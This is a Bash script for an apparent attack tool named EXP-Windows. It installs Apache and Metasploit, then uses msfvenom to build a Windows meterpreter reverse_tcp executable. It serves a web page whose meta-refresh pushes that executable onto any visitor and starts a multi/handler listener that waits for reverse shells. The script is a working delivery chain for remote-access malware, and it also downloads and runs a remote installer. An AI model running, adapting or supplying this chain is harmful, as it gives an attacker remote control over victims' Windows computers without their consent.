#!/bin/bash

#Compare - Version Is Greater* Than "Minimum Required Version"
function compare_versions_greater {
  awk -v n1="${1}" -v n2="${2}" 'BEGIN{if (n1>n2) exit 0; exit 1}'
}

#Compare - Bash Version Is Greater* Or Equal* Than "Minimum Required Bash Version"
function compare_versions_greater_equal {
  awk -v n1="${1}" -v n2="${2}" 'BEGIN{if (n1>=n2) exit 0; exit 1}'
}

#Check - User Has Root Permissions
function check_root {
  if [ $(whoami) = "root" ]; then
    echo -e "\n ${CGMRK} You HAVE Root Permissions ! "
  else
    echo -e "\n ${CBMRK} You DON'T Have Root Permissions "
    echo -en "\n ${CAMRK} Do: 'sudo bash $ScriptName' "
    sleep 2 && clear && exit
  fi
}

#Check - User Has The Required "Minimum Bash Version"
function check_bash {
  if compare_versions_greater_equal "${BashVersion}" "${MinBashVersion}"; then
    echo -e "\n ${CGMRK} You HAVE An Acceptable Bash Version ! "
  else
    echo -e "\n ${CBMRK} You DON'T Have An Acceptable Bash Version ( $BashVersion ) "
    echo -en "\n ${CAMRK} Minimum Required BASH Version: $MinBashVersion "
    sleep 2 && clear && exit
  fi
}

#Check - User Has CapsLock Enabled* Or Disabled*
function check_caps {
  if [ $(xset -q | grep Caps | cut -c 22-24) != "off" ]; then
    echo -en "\n ${CBMRK} You HAVE CapsLock ON - Script Requires CapsLock OFF "
    sleep 2 && clear && exit
  fi
}

#Check - User Has Internet Connection
function check_conn {
  if ping -c 1 google.com; then
    HasConnection=Yes
  fi
} > /dev/null 2>&1

#Check - See If EXP-Windows And Packages Needs To Be Updated
function check_updt {
  check_conn
  
  if [ "$UpdateScript" = "Yes" ] && [ "$HasConnection" = "Yes" ]; then
    cd /opt || exit
    
    echo -en "\n ${CAMRK} Please Wait A Second ... "
    if compare_versions_greater "${exploitw_last_version}" "${ScriptVersion}"; then
      sudo rm -rf /opt/EXP-Windows
      sudo git clone "https://github.com/midnightsonne/EXP-Windows.git"
      sudo chown -R "$UserName" /opt/EXP-Windows
    fi
    
    if compare_versions_greater "${config_last_version}" "${ConfigVersion}"; then
      sudo rm -rf /opt/EXP-Windows/.config
      wget "$urlconfig" /opt/EXP-Windows/.config
      sudo chown -R "$UserName" /opt/EXP-Windows/.config
    fi
    
    echo -e "\r ${CGMRK} You HAVE Script's Latest Version ! "
  else
    if [ "$HasConnection" != "Yes" ]; then
      echo -e "\n ${CBMRK} Update Failed - No Internet Connection "
    else
      echo -e "\n ${CAMRK} Update Failed - Update Disabled "
    fi
  fi
  
  # - These Are The Essential Packages Needed To Run Script
  Essential_PKGS=(
    "curl"
    "apache2"
    "xclip"
    "xterm"
    "x11-xserver-utils"
  )
  
  if [ "$UpdatePackages" = "Yes" ] && [ "$HasConnection" = "Yes" ]; then
    for Essential_PKGS in "${Essential_PKGS[@]}"; do
      if [ $(dpkg-query -W -f='${Status}' "$Essential_PKGS" 2> /dev/null | grep -c "ok installed") -eq 0 ]; then
        sudo apt-get -y install "$Essential_PKGS" > /dev/null 2>&1
      fi
    done
    
    function InstallMetasploit {
      cd /tmp
      curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
      sudo chmod +x msfinstall
      ./msfinstall
      xterm -e "msfdb init && exit"
    } > /dev/null 2>&1
    
    InstallMetasploit
  fi
}

#Function - Start "Apache2" Server, Create "Windows Executable File" File And Create "index.html" File
#Function - Create "Metasploit" File And Execute "Metasploit Framework"
function start_script {	clear
  
  sudo service apache2 start
  
  msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -o "$Exe_Path" 2> /dev/null
  
	cat >"$Index_Path" <<-EOF
		<!DOCTYPE HTML>
		<html>
		<head>
		<meta http-equiv="refresh" content="0;url='/$Exe_Name.exe'">
		</head>
		</html>
	EOF
  
  echo -n "&key=$APIKEY" | xclip -selection c
  
	cat >"$Meterpreter_Path" <<-EOF
		use exploit/multi/handler
		set PAYLOAD windows/meterpreter/reverse_tcp
		set LHOST $LHOST
		set LPORT $LPORT
		set ExitOnSession false
		exploit -j -z
		clear
	EOF
  
  msfconsole -q -r "$Meterpreter_Path" 2> /dev/null
}

#Function - End Script Cleaning Temporary Files And Stopping Services
function end_script {	clear
  
  echo -e "$CNC" " Cleaning Temporary Files ... \n"
  sudo rm -r "$Meterpreter_Path" 2> /dev/null
  sudo rm -r "$Index_Path" 2> /dev/null
  sudo rm -r "$Exe_Path" 2> /dev/null
  
  echo -e "$CNC" " Stopping Services ... \n"
  service apache2 stop 2> /dev/null
  
  echo -e "$CNC" " Exiting Script ... \n"
  sleep 0.5 && clear && exit
}
